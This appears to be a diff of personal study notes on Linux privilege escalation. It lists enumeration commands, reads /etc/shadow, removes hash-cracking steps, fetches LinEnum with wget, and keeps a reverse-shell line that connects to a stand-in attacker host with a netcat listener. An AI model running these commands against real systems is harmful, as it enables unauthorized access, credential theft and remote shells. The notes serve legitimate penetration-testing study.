@@ -1,5 +1,5 @@
 #linux/LPE
-#### Enumeration
+# Enumeration
 * `hostname`
 * `uname -a`
 * `cat /proc/version`
@@ -11,11 +11,7 @@
 * `id <username>`
 * `cat /etc/passwd` - list of users
 * `cat /etc/shadow` - password hashes
-	* `unshadow /etc/passwd /etc/shadow > combined.txt`
-	* `jonh --wordlist=/usr/share/wordlists/rockyou.txt combined.txt`
 	   * Detect hash type in `/etc/shadow` using `grep ENCRYPT_METHOD /etc/login.defs`
-	   * `hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` [[hashcat]]
-    
 * `history`
 * `ifconfig`
 * `ip route`
@@ -24,14 +20,16 @@
 * `find / -writable -type d 2>/dev/null` : Find world-writeable folders
 * `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
 * `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit
+* `find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student` - file all hidden files
+* `find / -type d -name ".*" -ls 2>/dev/null` - all hidden dirs
+* `ls -l /tmp /var/tmp /dev/shm` - tmp files
 ##### Automated tools
 - **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 - **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
+	* `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
 - **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
 - **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
 - **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)
-
-`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
 ## psspy
 Spy on running process to find passed function arguments like passwords
 https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
@@ -74,17 +72,6 @@ https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_pre
 bash -i >& /dev/tcp/attacker.ip/6666 0>&1   
 ```
 3. Listen on attacker machine: `nc -nlvp 6666`
-#### PATH
- If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
-1. What folders are located under $PATH
-2. Does your current user have write privileges for any of these folders?
-3. Can you modify $PATH?
-4. Is there a script/application you can start that will be affected by this vulnerability?
-![[LPE Linux PATH Step 1.png]]
-Find writable dirs:
-`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
-![[LPE Linux PATH Step 2.png]]
-![[LPE Linux PATH Step 3.png]]
 
 #### [[NFS]]
 List mountable devices `cat /etc/exports`
